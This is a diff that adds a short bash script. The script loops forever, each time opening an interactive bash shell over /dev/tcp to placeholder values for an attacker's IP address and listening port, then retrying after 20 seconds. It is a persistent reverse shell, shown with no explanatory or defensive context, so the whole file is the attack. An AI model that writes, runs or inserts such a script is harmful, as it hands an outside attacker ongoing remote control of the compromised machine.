@@ -1,0 +1,5 @@
+#!/bin/bash
+while :
+do bash -i >& /dev/tcp/<attacker's ip address>/<attackers listening port> >&1
+sleep 20
+done
